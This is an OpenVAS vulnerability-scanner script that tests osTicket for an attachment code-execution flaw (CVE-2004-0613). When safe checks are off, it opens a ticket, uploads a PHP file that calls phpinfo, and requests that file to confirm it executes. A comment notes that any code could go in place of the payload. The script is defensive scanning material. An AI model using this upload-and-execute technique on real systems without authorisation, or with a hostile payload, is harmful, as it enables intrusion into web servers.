# OpenVAS Vulnerability Test
# $Id: osticket_attachment_code_execution.nasl 17 2013-10-27 14:01:43Z jan $
# Description: osTicket Attachment Code Execution Vulnerability
#
# Authors:
# George A. Theall, <theall@tifaware.com>.
#
# Copyright:
# Copyright (C) 2004 George A. Theall
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The target is running at least one instance of osTicket that enables a
remote user to open a new ticket with an attachment containing arbitrary
PHP code and then to run that code using the permissions of the web
server user.";

tag_solution = "Apply FileTypes patch or upgrade to osTicket STS 1.2.7 or later.";

# NB: I define the script description here so I can later modify
#     it with the filename of the exploit.
desc = "
  Summary:
  " + tag_summary + "
  Solution:
  " + tag_solution;


if (description) {
  script_id(13645);
  script_version("$Revision: 17 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(10586);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");

  script_cve_id("CVE-2004-0613");

  name = "osTicket Attachment Code Execution Vulnerability";
  script_name(name);
 
  script_description(desc);
 
  summary = "Checks for Attachment Code Execution Vulnerability in osTicket";
  script_summary(summary);
 
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2004 George A. Theall");

  family = "Web application abuses";
  script_family(family);

  script_dependencies("global_settings.nasl", "http_version.nasl", "no404.nasl", "osticket_detect.nasl");
  script_require_ports("Services/www", 80);

  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

host = get_host_name();
port = get_http_port(default:80);
if (debug_level) display("debug: searching for attachment code execution vulnerability in osTicket on ", host, ":", port, ".\n");

if (!get_port_state(port)) exit(0);
if (get_kb_item("www/no404/" + port)) exit(0);

# Check each installed instance, stopping if we find a vulnerability.
installs = get_kb_list(string("www/", port, "/osticket"));
if (isnull(installs)) exit(0);
foreach install (installs) {
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches)) {
    ver = matches[1];
    dir = matches[2];
    if (debug_level) display("debug: checking version ", ver, " under ", dir, ".\n");

    # If safe_checks are enabled, rely on the version number alone.
    #
    # nb: this will be a false positive if the patch was applied!
    if (safe_checks()) {
      if (ereg(pattern:"^1\.2\.5$", string:ver)) {
        security_hole(port);
        exit(0);
      }
    }
    else {
      # Get osTicket's open.php.
      url = string(dir, "/open.php");
      if (debug_level) display("debug: checking ", url, ".\n");
      req = http_get(item:url, port:port);
      res = http_keepalive_send_recv(port:port, data:req);
      if (res == NULL) exit(0);           # can't connect
      if (debug_level) display("debug: res =>>", res, "<<\n");

      # If the form supports attachments...
      if (egrep(pattern:'type="file" name="attachment"', string:res, icase:TRUE)) {
        #  Grab the session cookie.
        pat = "Set-Cookie: (.+); path=";
        matches = egrep(pattern:pat, string:res, icase:TRUE);
        foreach match (split(matches)) {
          match = chomp(match);
          cookie = eregmatch(pattern:pat, string:match);
          if (cookie == NULL) break;
          cookie = cookie[1];
          if (debug_level) display("debug: session cookie =>>", cookie, "<<\n");
        }

        # Open a ticket as long as we have a session cookie.
        if (cookie) {
          boundary = "bound";
          req = string(
            "POST ",  url, " HTTP/1.1\r\n",
            "Host: ", host, ":", port, "\r\n",
            "Cookie: ", cookie, "\r\n",
            "Content-Type: multipart/form-data; boundary=", boundary, "\r\n"
            # nb: we'll add the Content-Length header and post data later.
          );
          boundary = string("--", boundary);
          postdata = string(
            boundary, "\r\n", 
            'Content-Disposition: form-data; name="name"', "\r\n",
            "\r\n",
            "openvas\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="email"', "\r\n",
            "\r\n",
            "postmaster@", host, "\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="phone"', "\r\n",
            "\r\n",
            "\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="cat"', "\r\n",
            "\r\n",
            "4\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="subject"', "\r\n",
            "\r\n",
            "Attachment Upload Test\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="message"', "\r\n",
            "\r\n",
            "Attempt to open a ticket and attach a file with executable code.\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="pri"', "\r\n",
            "\r\n",
            "1\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="MAX_FILE_SIZE"', "\r\n",
            "\r\n",
            "1048576\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="attachment"; filename="exploit.php"', "\r\n",
            "Content-Type: text/plain\r\n",
            "\r\n",
            # NB: This is the actual exploit code; you could put pretty much
            #     anything you want here.
            "<?php phpinfo() ?>\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="submit_x"', "\r\n",
            "\r\n",
            "Open Ticket\r\n",

            boundary, "--", "\r\n"
          );
          req = string(
            req,
            "Content-Length: ", strlen(postdata), "\r\n",
            "\r\n",
            postdata
          );
          if (debug_level) display("debug: sending =>>", req, "<<\n");
          res = http_keepalive_send_recv(port:port, data:req);
          if (res == NULL) exit(0);           # can't connect
          if (debug_level) display("debug: received =>>", res, "<<\n");

          # Grab the ticket number that was issued.
          pat = 'name="login_ticket" .+ value="(.+)">';
          if (matches = egrep(pattern:pat, string:res, icase:TRUE)) {
            foreach match (split(matches)) {
              match = chomp(match);
              ticket = eregmatch(pattern:pat, string:match);
              if (ticket == NULL) break;
              ticket = ticket[1];
              if (debug_level) display("debug: ticket # =>>", ticket, "<<\n");
            }
            if (ticket) {
              # Run the attachment we just uploaded.
              url = string(dir, "/attachments/", ticket, "_exploit.php");
              if (debug_level) display("debug: checking ", url, ".\n");
              req = http_get(item:url, port:port);
              res = http_keepalive_send_recv(port:port, data:req);
              if (res == NULL) exit(0);           # can't connect
              if (debug_level) display("debug: res =>>", res, "<<\n");

              # If we could run it, there's a problem.
              if (egrep(pattern:"200 OK", string:res, icase:TRUE)) {
                desc = str_replace(
                  string:desc,
                  find:"Solution:",
                  replace:string(
                    "**** OpenVAS successfully opened ticket #", ticket, " and uploaded\n",
                    "**** an exploit as ", ticket, "_exploit.php to osTicket's attachment\n",
                    "**** directory. You are strongly encouraged to delete this attachment\n",
                    "**** as soon as possible as it can be run by anyone who accesses.\n",
                    "**** it remotely.\n",
                    "\n",
                    "Solution:"
                  )
                );
                security_hole(port:port, data:desc);
                exit(0);
              }
            }
          }
        }
      }
    }
  }
}
